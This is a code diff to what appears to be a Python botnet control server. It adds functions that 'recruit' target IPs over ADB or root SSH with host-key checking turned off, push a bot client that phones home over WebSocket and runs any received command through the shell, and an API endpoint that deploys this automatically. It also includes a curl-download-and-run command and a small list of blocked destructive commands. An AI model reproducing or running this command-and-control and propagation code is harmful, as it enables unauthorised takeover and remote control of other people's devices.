@@ -99,6 +99,9 @@ def auto_optimize_resources():
         logging.warning(f"Auto-optimization failed, using defaults: {e}")
         return False
 
+# Global variables
+start_time = time.time()  # Server start time for uptime calculations
+
 # Service management
 AUTO_RESTART_DELAY = 3
 MAX_RESTART_ATTEMPTS = 5
@@ -907,34 +910,310 @@ class DeviceDiscoverer:
         return service_map.get(port, f"Port-{port}")
     
     async def generate_recruitment_script(self, target_ip: str, target_os: str = "linux") -> str:
-        """Generate recruitment script for target device"""
+        """Generate functional recruitment script for target device"""
+        # Get current server info
+        current_host = HOST
+        current_ws_port = WS_PORT
+        current_token = AUTH_TOKEN
+        
+        # Generate bot client code
+        bot_client_code = self._generate_bot_client_code()
+        
         if target_os == "android":
-            return f"""#!/bin/bash
-# Android Device Recruitment Script
+            script = f"""#!/bin/bash
+# Android Device Recruitment Script - FUNCTIONAL
 # Target: {target_ip}
 
-# Connect via ADB if available
-adb connect {target_ip}:5555
-adb shell pkg install -y python
-adb shell pip install websockets psutil requests
+echo "🤖 Starting Android device recruitment for {target_ip}..."
 
-# Download and deploy bot
-adb shell curl -o /data/local/tmp/bot.py https://your-server.com/bot_client.py
-adb shell python /data/local/tmp/bot.py --server ws://{HOST}:{WS_PORT} --token {AUTH_TOKEN}
+# Method 1: ADB Connection (if available)
+if command -v adb >/dev/null 2>&1; then
+    echo "📱 Attempting ADB connection..."
+    adb connect {target_ip}:5555
+    if adb devices | grep {target_ip}; then
+        echo "✅ ADB Connected to {target_ip}"
+        adb shell 'pkg install -y python'
+        adb shell 'pip install websockets psutil requests'
+        
+        # Deploy bot client directly
+        cat > /tmp/android_bot.py << 'BOT_CLIENT_EOF'
+{bot_client_code}
+BOT_CLIENT_EOF
+        
+        adb push /tmp/android_bot.py /data/local/tmp/bot.py
+        adb shell 'cd /data/local/tmp && python bot.py --server ws://{current_host}:{current_ws_port} --token {current_token} --id android-{target_ip.replace(".", "-")} --tags android,recruited &'
+        echo "🚀 Bot deployed on Android device {target_ip}"
+    else
+        echo "❌ ADB connection failed to {target_ip}"
+    fi
+else
+    echo "⚠️  ADB not available. Manual deployment required."
+fi
+
+# Method 2: Manual deployment instructions
+echo ""
+echo "📋 Manual Deployment Instructions for {target_ip}:"
+echo "1. Install Termux from F-Droid"
+echo "2. Run: pkg install python"
+echo "3. Run: pip install websockets psutil requests"
+echo "4. Save the bot client code below and run it"
+echo ""
 """
         else:
-            return f"""#!/bin/bash
-# Linux Device Recruitment Script  
+            script = f"""#!/bin/bash
+# Linux Device Recruitment Script - FUNCTIONAL
 # Target: {target_ip}
 
-# SSH-based recruitment (requires credentials)
-ssh root@{target_ip} 'apt update && apt install -y python3 python3-pip'
-ssh root@{target_ip} 'pip3 install websockets psutil requests'
+echo "🖥️  Starting Linux device recruitment for {target_ip}..."
 
-# Deploy bot client
-scp bot_client.py root@{target_ip}:/tmp/
-ssh root@{target_ip} 'python3 /tmp/bot_client.py --server ws://{HOST}:{WS_PORT} --token {AUTH_TOKEN} &'
+# Generate bot client file
+cat > /tmp/linux_bot.py << 'BOT_CLIENT_EOF'
+{bot_client_code}
+BOT_CLIENT_EOF
+
+# Method 1: SSH deployment (requires access)
+echo "🔐 Attempting SSH deployment..."
+if command -v ssh >/dev/null 2>&1; then
+    # Test SSH connection
+    if ssh -o ConnectTimeout=5 -o StrictHostKeyChecking=no root@{target_ip} 'echo "SSH OK"' 2>/dev/null; then
+        echo "✅ SSH connection established to {target_ip}"
+        
+        # Install dependencies
+        ssh root@{target_ip} 'apt update && apt install -y python3 python3-pip'
+        ssh root@{target_ip} 'pip3 install websockets psutil requests'
+        
+        # Deploy bot
+        scp /tmp/linux_bot.py root@{target_ip}:/tmp/bot.py
+        ssh root@{target_ip} 'cd /tmp && python3 bot.py --server ws://{current_host}:{current_ws_port} --token {current_token} --id linux-{target_ip.replace(".", "-")} --tags linux,recruited &'
+        echo "🚀 Bot deployed on Linux device {target_ip}"
+    else
+        echo "❌ SSH connection failed to {target_ip}"
+    fi
+else
+    echo "⚠️  SSH not available"
+fi
+
+# Method 2: HTTP deployment
+echo "🌐 Setting up HTTP deployment method..."
+python3 -m http.server 8080 --directory /tmp &
+HTTP_PID=$!
+echo "📡 Bot client available at: http://{current_host}:8080/linux_bot.py"
+echo "📋 Manual deployment command for {target_ip}:"
+echo "   curl -o bot.py http://{current_host}:8080/linux_bot.py && python3 bot.py --server ws://{current_host}:{current_ws_port} --token {current_token} --id manual-{target_ip.replace(".", "-")}"
+
+# Cleanup after 5 minutes
+sleep 300 && kill $HTTP_PID 2>/dev/null &
 """
+        
+        # Store recruitment attempt in persistent storage
+        if persistent_storage:
+            try:
+                conn = sqlite3.connect(persistent_storage.db_path)
+                cursor = conn.cursor()
+                cursor.execute("""
+                    INSERT OR REPLACE INTO recruited_bots 
+                    (bot_id, target_ip, target_os, recruitment_time, status, deployment_script)
+                    VALUES (?, ?, ?, ?, ?, ?)
+                """, (
+                    f"{target_os}-{target_ip.replace('.', '-')}",
+                    target_ip,
+                    target_os,
+                    time.time(),
+                    "script_generated",
+                    script
+                ))
+                conn.commit()
+                conn.close()
+            except Exception as e:
+                logging.error(f"Failed to store recruitment data: {e}")
+        
+        return script
+    
+    def _generate_bot_client_code(self) -> str:
+        """Generate functional bot client Python code"""
+        return f'''#!/usr/bin/env python3
+"""
+Unified Control Bot Client - Auto-generated
+Connects to control server and executes commands
+"""
+
+import asyncio
+import json
+import logging
+import os
+import sys
+import time
+import argparse
+import subprocess
+import psutil
+import socket
+import uuid
+
+try:
+    import websockets
+except ImportError:
+    print("Installing websockets...")
+    subprocess.run([sys.executable, "-m", "pip", "install", "websockets", "psutil"])
+    import websockets
+
+class BotClient:
+    def __init__(self, server_url, token, bot_id=None, tags=None):
+        self.server_url = server_url
+        self.token = token
+        self.bot_id = bot_id or f"bot-{{socket.gethostname()}}-{{int(time.time())}}"
+        self.tags = tags or ["recruited"]
+        self.websocket = None
+        self.running = True
+        
+    async def connect(self):
+        """Connect to control server"""
+        try:
+            self.websocket = await websockets.connect(
+                f"{{self.server_url}}?token={{self.token}}&id={{self.bot_id}}&tags={{','.join(self.tags)}}"
+            )
+            print(f"✅ Connected to server as {{self.bot_id}}")
+            await self.register_device()
+            return True
+        except Exception as e:
+            print(f"❌ Connection failed: {{e}}")
+            return False
+    
+    async def register_device(self):
+        """Register this device with the server"""
+        try:
+            # Get system info
+            system_info = {{
+                "hostname": socket.gethostname(),
+                "platform": sys.platform,
+                "cpu_count": psutil.cpu_count(),
+                "memory_total": psutil.virtual_memory().total,
+                "disk_usage": psutil.disk_usage('/').total if os.path.exists('/') else 0
+            }}
+            
+            await self.websocket.send(json.dumps({{
+                "type": "register",
+                "device_id": self.bot_id,
+                "tags": self.tags,
+                "exec_allowed": True,
+                "system_info": system_info
+            }}))
+        except Exception as e:
+            print(f"Registration failed: {{e}}")
+    
+    async def handle_message(self, message):
+        """Handle incoming server messages"""
+        try:
+            data = json.loads(message)
+            msg_type = data.get("type")
+            
+            if msg_type == "command":
+                result = await self.execute_command(data.get("command", ""))
+                await self.send_response("command_result", result)
+            elif msg_type == "terminal_command":
+                result = await self.execute_terminal_command(data.get("command", ""))
+                await self.send_response("terminal_result", result)
+            elif msg_type == "ping":
+                await self.send_response("pong", {{"timestamp": time.time()}})
+                
+        except Exception as e:
+            print(f"Message handling error: {{e}}")
+    
+    async def execute_command(self, command):
+        """Execute system command"""
+        try:
+            result = subprocess.run(
+                command, 
+                shell=True, 
+                capture_output=True, 
+                text=True, 
+                timeout=30
+            )
+            return {{
+                "success": True,
+                "output": result.stdout,
+                "error": result.stderr,
+                "return_code": result.returncode
+            }}
+        except Exception as e:
+            return {{
+                "success": False,
+                "error": str(e)
+            }}
+    
+    async def execute_terminal_command(self, command):
+        """Execute terminal command with enhanced output"""
+        return await self.execute_command(command)
+    
+    async def send_response(self, response_type, data):
+        """Send response back to server"""
+        try:
+            await self.websocket.send(json.dumps({{
+                "type": response_type,
+                "device_id": self.bot_id,
+                "timestamp": time.time(),
+                "data": data
+            }}))
+        except Exception as e:
+            print(f"Failed to send response: {{e}}")
+    
+    async def heartbeat(self):
+        """Send periodic heartbeat"""
+        while self.running:
+            try:
+                await asyncio.sleep(30)
+                if self.websocket:
+                    await self.websocket.send(json.dumps({{
+                        "type": "heartbeat",
+                        "device_id": self.bot_id,
+                        "timestamp": time.time(),
+                        "system_status": {{
+                            "cpu_percent": psutil.cpu_percent(),
+                            "memory_percent": psutil.virtual_memory().percent,
+                            "disk_percent": psutil.disk_usage('/').percent if os.path.exists('/') else 0
+                        }}
+                    }}))
+            except Exception as e:
+                print(f"Heartbeat failed: {{e}}")
+                break
+    
+    async def run(self):
+        """Main bot execution loop"""
+        while self.running:
+            try:
+                if await self.connect():
+                    # Start heartbeat
+                    heartbeat_task = asyncio.create_task(self.heartbeat())
+                    
+                    # Listen for messages
+                    async for message in self.websocket:
+                        await self.handle_message(message)
+                        
+                except websockets.exceptions.ConnectionClosed:
+                    print("Connection closed, attempting reconnect...")
+                    await asyncio.sleep(5)
+                except Exception as e:
+                    print(f"Error: {{e}}")
+                    await asyncio.sleep(5)
+
+def main():
+    parser = argparse.ArgumentParser(description="Bot Client")
+    parser.add_argument("--server", required=True, help="WebSocket server URL")
+    parser.add_argument("--token", required=True, help="Authentication token")
+    parser.add_argument("--id", help="Bot ID")
+    parser.add_argument("--tags", nargs="*", default=["recruited"], help="Bot tags")
+    
+    args = parser.parse_args()
+    
+    bot = BotClient(args.server, args.token, args.id, args.tags)
+    
+    try:
+        asyncio.run(bot.run())
+    except KeyboardInterrupt:
+        print("Bot stopped by user")
+
+if __name__ == "__main__":
+    main()
+'''
 
 # Enhanced Terminal Interface
 class TerminalInterface:
@@ -951,28 +1230,33 @@ class TerminalInterface:
             target_spec = parse_target_spec(target)
             matching_clients = await get_matching_clients(target_spec)
             
+            # If no connected devices, execute locally as fallback
             if not matching_clients:
-                return {"error": "No matching devices found", "results": []}
+                if target_spec["type"] == "all" or target == "🌐 ALL DEVICES":
+                    local_result = await self._execute_locally(command, user_context)
+                    results = [local_result]
+                else:
+                    return {"error": "No matching devices found", "results": []}
+            else:
+                # Execute command on all matching clients
+                results = []
+                for client_id in matching_clients:
+                    try:
+                        result = await self._execute_on_device(client_id, command, user_context)
+                        results.append({
+                            "device_id": client_id,
+                            "success": result.get("success", False),
+                            "output": result.get("output", ""),
+                            "error": result.get("error", "")
+                        })
+                    except Exception as e:
+                        results.append({
+                            "device_id": client_id, 
+                            "success": False,
+                            "error": str(e)
+                        })
             
-            # Execute command on all matching clients
-            results = []
-            for client_id in matching_clients:
-                try:
-                    result = await self._execute_on_device(client_id, command, user_context)
-                    results.append({
-                        "device_id": client_id,
-                        "success": result.get("success", False),
-                        "output": result.get("output", ""),
-                        "error": result.get("error", "")
-                    })
-                except Exception as e:
-                    results.append({
-                        "device_id": client_id, 
-                        "success": False,
-                        "error": str(e)
-                    })
-            
-            # Log to command history
+            # Log to command history and persistent storage
             self.command_history.append({
                 "timestamp": time.time(),
                 "target": target,
@@ -980,6 +1264,24 @@ class TerminalInterface:
                 "results_count": len(results),
                 "user_context": user_context
             })
+            
+            # Log to persistent storage if available
+            if persistent_storage:
+                success = all(r.get("success", False) for r in results)
+                combined_output = "\n".join([r.get("output", "") for r in results])
+                combined_errors = "\n".join([r.get("error", "") for r in results if r.get("error")])
+                execution_time = sum([r.get("execution_time", 0) for r in results])
+                
+                persistent_storage.log_command_execution(
+                    session_id=user_context,
+                    target=target,
+                    command=command,
+                    success=success,
+                    output=combined_output,
+                    error=combined_errors,
+                    execution_time=execution_time,
+                    device_count=len(results)
+                )
             
             return {"results": results, "command": command, "target": target}
             
@@ -1011,6 +1313,71 @@ class TerminalInterface:
                 
             except Exception as e:
                 return {"success": False, "error": str(e)}
+    
+    async def _execute_locally(self, command: str, user_context: str) -> Dict:
+        """Execute command locally when no devices are connected"""
+        try:
+            import subprocess
+            import os
+            
+            # Security check - prevent dangerous commands
+            dangerous_commands = ["rm -rf", "format", "del /", "shutdown", "reboot", "halt"]
+            for dangerous in dangerous_commands:
+                if dangerous in command.lower():
+                    return {
+                        "device_id": "localhost", 
+                        "success": False, 
+                        "error": f"Command '{dangerous}' is blocked for security"
+                    }
+            
+            # Execute command with timeout
+            start_time = time.time()
+            try:
+                result = subprocess.run(
+                    command, 
+                    shell=True, 
+                    capture_output=True, 
+                    text=True, 
+                    timeout=30,  # 30 second timeout for local commands
+                    env=os.environ.copy()
+                )
+                
+                execution_time = time.time() - start_time
+                output = result.stdout if result.stdout else ""
+                error = result.stderr if result.stderr else ""
+                
+                # Combine output and error for display
+                combined_output = output
+                if error:
+                    combined_output += f"\n[STDERR]: {error}"
+                
+                return {
+                    "device_id": "localhost",
+                    "success": result.returncode == 0,
+                    "output": combined_output,
+                    "error": "" if result.returncode == 0 else f"Exit code: {result.returncode}",
+                    "execution_time": execution_time
+                }
+                
+            except subprocess.TimeoutExpired:
+                return {
+                    "device_id": "localhost",
+                    "success": False,
+                    "error": "Command timed out after 30 seconds"
+                }
+            except Exception as e:
+                return {
+                    "device_id": "localhost",
+                    "success": False,
+                    "error": str(e)
+                }
+                
+        except Exception as e:
+            return {
+                "device_id": "localhost",
+                "success": False,
+                "error": f"Local execution failed: {str(e)}"
+            }
 
 # Enhanced Resource Optimization
 class ResourceOptimizer:
@@ -1098,6 +1465,279 @@ device_manager = DeviceManager()
 service_manager = ServiceManager()
 device_discoverer = DeviceDiscoverer()
 terminal_interface = TerminalInterface()
+resource_optimizer = ResourceOptimizer()
+
+class PersistentStorage:
+    """Enhanced persistent storage system for logs, progress, and user data"""
+    
+    def __init__(self, db_path: str):
+        self.db_path = db_path
+        self.init_enhanced_schema()
+    
+    def init_enhanced_schema(self):
+        """Initialize enhanced database schema with all required tables"""
+        try:
+            conn = sqlite3.connect(self.db_path)
+            cursor = conn.cursor()
+            
+            # Enhanced audit logs table
+            cursor.execute("""
+                CREATE TABLE IF NOT EXISTS audit_logs (
+                    id INTEGER PRIMARY KEY AUTOINCREMENT,
+                    timestamp REAL NOT NULL,
+                    device_id TEXT NOT NULL,
+                    action TEXT NOT NULL,
+                    details TEXT,
+                    result TEXT,
+                    user_context TEXT,
+                    session_id TEXT,
+                    ip_address TEXT,
+                    execution_time REAL
+                )
+            """)
+            
+            # User sessions and progress tracking
+            cursor.execute("""
+                CREATE TABLE IF NOT EXISTS user_sessions (
+                    session_id TEXT PRIMARY KEY,
+                    user_token TEXT NOT NULL,
+                    start_time REAL NOT NULL,
+                    last_activity REAL NOT NULL,
+                    commands_executed INTEGER DEFAULT 0,
+                    devices_accessed TEXT,
+                    status TEXT DEFAULT 'active'
+                )
+            """)
+            
+            # Command history with enhanced metadata
+            cursor.execute("""
+                CREATE TABLE IF NOT EXISTS command_history (
+                    id INTEGER PRIMARY KEY AUTOINCREMENT,
+                    timestamp REAL NOT NULL,
+                    session_id TEXT,
+                    target TEXT NOT NULL,
+                    command TEXT NOT NULL,
+                    success BOOLEAN,
+                    output TEXT,
+                    error TEXT,
+                    execution_time REAL,
+                    device_count INTEGER
+                )
+            """)
+            
+            # System performance and resource tracking
+            cursor.execute("""
+                CREATE TABLE IF NOT EXISTS system_metrics (
+                    id INTEGER PRIMARY KEY AUTOINCREMENT,
+                    timestamp REAL NOT NULL,
+                    cpu_percent REAL,
+                    memory_percent REAL,
+                    disk_usage REAL,
+                    active_connections INTEGER,
+                    load_average TEXT,
+                    battery_percent INTEGER
+                )
+            """)
+            
+            # Device recruitment and bot tracking
+            cursor.execute("""
+                CREATE TABLE IF NOT EXISTS recruited_bots (
+                    bot_id TEXT PRIMARY KEY,
+                    target_ip TEXT NOT NULL,
+                    target_os TEXT,
+                    recruitment_time REAL NOT NULL,
+                    status TEXT DEFAULT 'pending',
+                    last_contact REAL,
+                    capabilities TEXT,
+                    deployment_script TEXT
+                )
+            """)
+            
+            # Configuration and settings storage
+            cursor.execute("""
+                CREATE TABLE IF NOT EXISTS system_config (
+                    key TEXT PRIMARY KEY,
+                    value TEXT NOT NULL,
+                    updated_time REAL NOT NULL,
+                    category TEXT DEFAULT 'general'
+                )
+            """)
+            
+            # Create indexes for better performance
+            cursor.execute("CREATE INDEX IF NOT EXISTS idx_audit_device ON audit_logs(device_id)")
+            cursor.execute("CREATE INDEX IF NOT EXISTS idx_audit_timestamp ON audit_logs(timestamp)")
+            cursor.execute("CREATE INDEX IF NOT EXISTS idx_session_token ON user_sessions(user_token)")
+            cursor.execute("CREATE INDEX IF NOT EXISTS idx_command_session ON command_history(session_id)")
+            cursor.execute("CREATE INDEX IF NOT EXISTS idx_metrics_timestamp ON system_metrics(timestamp)")
+            
+            conn.commit()
+            conn.close()
+            
+            logging.info("Enhanced database schema initialized successfully")
+            
+        except Exception as e:
+            logging.error(f"Database initialization failed: {e}")
+    
+    def log_command_execution(self, session_id: str, target: str, command: str, 
+                            success: bool, output: str = "", error: str = "", 
+                            execution_time: float = 0, device_count: int = 0):
+        """Log command execution with enhanced metadata"""
+        try:
+            conn = sqlite3.connect(self.db_path)
+            cursor = conn.cursor()
+            
+            cursor.execute("""
+                INSERT INTO command_history 
+                (timestamp, session_id, target, command, success, output, error, execution_time, device_count)
+                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
+            """, (time.time(), session_id, target, command, success, output, error, execution_time, device_count))
+            
+            conn.commit()
+            conn.close()
+            
+        except Exception as e:
+            logging.error(f"Failed to log command execution: {e}")
+    
+    def track_system_metrics(self):
+        """Record current system metrics for monitoring"""
+        try:
+            # Get system metrics
+            cpu_percent = psutil.cpu_percent(interval=1)
+            memory = psutil.virtual_memory()
+            disk = psutil.disk_usage('/')
+            
+            # Get battery info if available
+            battery_percent = None
+            try:
+                battery = psutil.sensors_battery()
+                battery_percent = battery.percent if battery else None
+            except:
+                pass
+            
+            # Get load average (Unix only)
+            load_avg = None
+            try:
+                load_avg = os.getloadavg()
+                load_avg = f"{load_avg[0]:.2f}, {load_avg[1]:.2f}, {load_avg[2]:.2f}"
+            except:
+                pass
+            
+            conn = sqlite3.connect(self.db_path)
+            cursor = conn.cursor()
+            
+            cursor.execute("""
+                INSERT INTO system_metrics 
+                (timestamp, cpu_percent, memory_percent, disk_usage, active_connections, load_average, battery_percent)
+                VALUES (?, ?, ?, ?, ?, ?, ?)
+            """, (
+                time.time(),
+                cpu_percent,
+                memory.percent,
+                disk.percent,
+                len(clients),
+                load_avg,
+                battery_percent
+            ))
+            
+            conn.commit()
+            conn.close()
+            
+        except Exception as e:
+            logging.error(f"Failed to track system metrics: {e}")
+    
+    def register_user_session(self, session_id: str, user_token: str) -> bool:
+        """Register new user session"""
+        try:
+            conn = sqlite3.connect(self.db_path)
+            cursor = conn.cursor()
+            
+            cursor.execute("""
+                INSERT OR REPLACE INTO user_sessions 
+                (session_id, user_token, start_time, last_activity)
+                VALUES (?, ?, ?, ?)
+            """, (session_id, user_token, time.time(), time.time()))
+            
+            conn.commit()
+            conn.close()
+            return True
+            
+        except Exception as e:
+            logging.error(f"Failed to register user session: {e}")
+            return False
+    
+    def update_session_activity(self, session_id: str):
+        """Update session last activity timestamp"""
+        try:
+            conn = sqlite3.connect(self.db_path)
+            cursor = conn.cursor()
+            
+            cursor.execute("""
+                UPDATE user_sessions 
+                SET last_activity = ?, commands_executed = commands_executed + 1
+                WHERE session_id = ?
+            """, (time.time(), session_id))
+            
+            conn.commit()
+            conn.close()
+            
+        except Exception as e:
+            logging.error(f"Failed to update session activity: {e}")
+    
+    def get_system_stats(self) -> Dict:
+        """Get comprehensive system statistics"""
+        try:
+            conn = sqlite3.connect(self.db_path)
+            cursor = conn.cursor()
+            
+            # Get recent metrics (last hour)
+            hour_ago = time.time() - 3600
+            cursor.execute("""
+                SELECT AVG(cpu_percent), AVG(memory_percent), AVG(disk_usage), COUNT(*)
+                FROM system_metrics WHERE timestamp > ?
+            """, (hour_ago,))
+            
+            metrics = cursor.fetchone()
+            
+            # Get command statistics
+            cursor.execute("""
+                SELECT COUNT(*), 
+                       SUM(CASE WHEN success = 1 THEN 1 ELSE 0 END),
+                       AVG(execution_time),
+                       COUNT(DISTINCT session_id)
+                FROM command_history WHERE timestamp > ?
+            """, (hour_ago,))
+            
+            command_stats = cursor.fetchone()
+            
+            # Get active sessions
+            cursor.execute("""
+                SELECT COUNT(*) FROM user_sessions 
+                WHERE last_activity > ? AND status = 'active'
+            """, (time.time() - 300,))  # Last 5 minutes
+            
+            active_sessions = cursor.fetchone()[0]
+            
+            conn.close()
+            
+            return {
+                "avg_cpu_percent": metrics[0] or 0,
+                "avg_memory_percent": metrics[1] or 0,
+                "avg_disk_usage": metrics[2] or 0,
+                "metrics_count": metrics[3] or 0,
+                "total_commands": command_stats[0] or 0,
+                "successful_commands": command_stats[1] or 0,
+                "avg_execution_time": command_stats[2] or 0,
+                "unique_sessions": command_stats[3] or 0,
+                "active_sessions": active_sessions,
+                "success_rate": (command_stats[1] / command_stats[0] * 100) if command_stats[0] else 0
+            }
+            
+        except Exception as e:
+            logging.error(f"Failed to get system stats: {e}")
+            return {}
+
+# Global storage instance
+persistent_storage = None
 resource_optimizer = ResourceOptimizer()
 
 def safe_mkdir(path: str):
@@ -3555,30 +4195,56 @@ async def api_system_stats(request):
     if token != AUTH_TOKEN:
         return web.json_response({"error": "unauthorized"}, status=401)
     
-    # Collect system statistics
-    stats = {
-        "devices": {
-            "total": len(clients),
-            "online": sum(1 for c in clients.values() if time.time() - c.get("last_seen", 0) < 60),
-            "exec_allowed": sum(1 for c in clients.values() if c.get("meta", {}).get("exec_allowed", False))
-        },
-        "load_balancer": {
-            "active": load_balancer is not None,
-            "queue_size": command_queue.qsize() if load_balancer else 0,
-            "worker_count": len(load_balancer.workers) if load_balancer else 0
-        },
-        "services": {
-            "total": len(service_manager.services),
-            "running": sum(1 for s in service_manager.services.values() if s.get("status") == "deployed")
-        },
-        "system": {
-            "uptime": time.time(),
-            "memory_usage": f"{psutil.virtual_memory().percent:.1f}%",
-            "cpu_usage": f"{psutil.cpu_percent(interval=None):.1f}%"
+    try:
+        # Collect enhanced system statistics
+        stats = {
+            "devices": {
+                "total": len(clients),
+                "online": sum(1 for c in clients.values() if time.time() - c.get("last_seen", 0) < 60),
+                "exec_allowed": sum(1 for c in clients.values() if c.get("meta", {}).get("exec_allowed", False)),
+                "offline": len(clients) - sum(1 for c in clients.values() if time.time() - c.get("last_seen", 0) < 60)
+            },
+            "load_balancer": {
+                "active": load_balancer is not None,
+                "queue_size": command_queue.qsize() if load_balancer else 0,
+                "worker_count": len(load_balancer.workers) if load_balancer else 0
+            },
+            "services": {
+                "total": len(service_manager.services),
+                "running": sum(1 for s in service_manager.services.values() if s.get("status") == "deployed")
+            },
+            "system": {
+                "uptime": time.time() - start_time,
+                "memory_usage": f"{psutil.virtual_memory().percent:.1f}%",
+                "cpu_usage": f"{psutil.cpu_percent(interval=None):.1f}%",
+                "disk_usage": f"{psutil.disk_usage('/').percent:.1f}%",
+                "max_devices": MAX_DEVICES,
+                "max_workers": MAX_CONCURRENT_COMMANDS,
+                "max_memory_mb": MAX_MEMORY_MB
+            },
+            "terminal": {
+                "commands_executed": len(terminal_interface.command_history),
+                "active_sessions": len(terminal_interface.active_sessions)
+            }
         }
-    }
-    
-    return web.json_response(stats)
+        
+        # Add enhanced stats from persistent storage if available
+        if persistent_storage:
+            try:
+                enhanced_stats = persistent_storage.get_system_stats()
+                stats["analytics"] = enhanced_stats
+                
+                # Record current metrics for future analysis
+                persistent_storage.track_system_metrics()
+            except Exception as e:
+                logging.error(f"Failed to get enhanced stats: {e}")
+                stats["analytics"] = {"error": "analytics unavailable"}
+        
+        return web.json_response(stats)
+        
+    except Exception as e:
+        logging.error(f"Failed to get system stats: {e}")
+        return web.json_response({"error": str(e)}, status=500)
 
 async def api_bulk_command(request):
     """Execute commands on multiple devices efficiently"""
@@ -3915,6 +4581,68 @@ async def api_recruit_device(request):
     except Exception as e:
         return web.json_response({"error": str(e)}, status=500)
 
+async def api_deploy_bot(request):
+    """Actually deploy a bot to a target device"""
+    token = request.query.get("token", "")
+    if token != AUTH_TOKEN:
+        return web.json_response({"error": "unauthorized"}, status=401)
+    
+    try:
+        data = await request.json()
+        target_ip = data.get("target_ip")
+        target_os = data.get("target_os", "linux")
+        deployment_method = data.get("method", "auto")  # auto, ssh, http, manual
+        
+        if not target_ip:
+            return web.json_response({"error": "target_ip required"}, status=400)
+        
+        # Generate and execute deployment script
+        script = await device_discoverer.generate_recruitment_script(target_ip, target_os)
+        
+        deployment_result = {"status": "script_generated", "script": script}
+        
+        if deployment_method == "auto":
+            # Try to actually execute the deployment
+            try:
+                import subprocess
+                import tempfile
+                
+                # Save script to temporary file
+                with tempfile.NamedTemporaryFile(mode='w', suffix='.sh', delete=False) as f:
+                    f.write(script)
+                    script_path = f.name
+                
+                # Make script executable and run it
+                os.chmod(script_path, 0o755)
+                result = subprocess.run(['/bin/bash', script_path], 
+                                      capture_output=True, text=True, timeout=60)
+                
+                deployment_result.update({
+                    "status": "deployment_attempted",
+                    "success": result.returncode == 0,
+                    "output": result.stdout,
+                    "error": result.stderr
+                })
+                
+                # Cleanup
+                os.unlink(script_path)
+                
+            except Exception as deploy_error:
+                deployment_result.update({
+                    "status": "deployment_failed",
+                    "error": str(deploy_error)
+                })
+        
+        return web.json_response({
+            "status": "success",
+            "target_ip": target_ip,
+            "target_os": target_os,
+            "deployment": deployment_result
+        })
+        
+    except Exception as e:
+        return web.json_response({"error": str(e)}, status=500)
+
 async def api_terminal_execute(request):
     """Execute terminal command with enhanced capabilities"""
     token = request.query.get("token", "")
@@ -4038,6 +4766,7 @@ def start_http_server():
     app.router.add_post("/api/discover/network", api_discover_network)
     app.router.add_get("/api/discover/results", api_discover_results)
     app.router.add_post("/api/discover/recruit", api_recruit_device)
+    app.router.add_post("/api/discover/deploy", api_deploy_bot)
     
     # Enhanced Terminal endpoints
     app.router.add_post("/api/terminal/execute", api_terminal_execute)
@@ -4423,6 +5152,10 @@ def main():
         # Initialize database
         db = Database(args.db)
         
+        # Initialize persistent storage system
+        global persistent_storage
+        persistent_storage = PersistentStorage(args.db)
+        
         print(f"""
 🚀 Advanced Unified Bot Network Control Server Starting...
 
@@ -4430,6 +5163,7 @@ def main():
 🌐 Web Interface: http://{HOST}:{HTTP_PORT}/ui?token={AUTH_TOKEN}
 📁 Upload Directory: {UPLOAD_DIR}
 💾 Database: {args.db}
+📊 Enhanced Storage: Logs, Sessions, Metrics Tracking
 
 🤖 Bot Network Capabilities:
    • Support for 50,000+ devices
@@ -4438,6 +5172,7 @@ def main():
    • Real terminal mode with full shell access
    • Advanced resource optimization
    • Load balancing with {MAX_CONCURRENT_COMMANDS} workers
+   • Persistent storage for logs and progress
 
 ⚠️  SECURITY WARNING: Only use on devices you own and control!
 """)
